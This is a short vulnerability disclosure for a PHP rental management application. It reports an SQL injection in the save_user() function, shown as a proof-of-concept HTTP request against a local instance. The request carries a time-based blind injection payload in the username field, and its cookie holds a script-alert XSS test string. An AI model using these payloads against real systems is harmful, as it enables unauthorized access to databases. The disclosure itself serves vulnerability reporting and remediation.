#### There is an SQL injection vulnerability in the save_user() function of the file rental/admin_class.php.

**Code Analysis**

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910164506067.png)

No filtering was performed on username, which was directly concatenated into the SQL statement, creating a vulnerability exploit point.

**Vulnerability reproduction**

poc

```http
POST /ajax.php?action=save_user HTTP/1.1
Host: localhost:1110
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 105
Origin: http://localhost:1110
Connection: keep-alive
Referer: http://localhost:1110/index.php?page=users
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; XDEBUG_SESSION=13926; PHPSESSID=3hl2t1rg411rdcvu3pagf1cg5n
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

id=2&name=ton&username=jerry%40qq.com'or%20(select(123)from(select(sleep(6)))x)%23&password=123456&type=1
```

Seeing success delayed by 6 seconds.

![](https://raw.githubusercontent.com/gaorenyusi/img/master/img/image-20240910164628867.png)

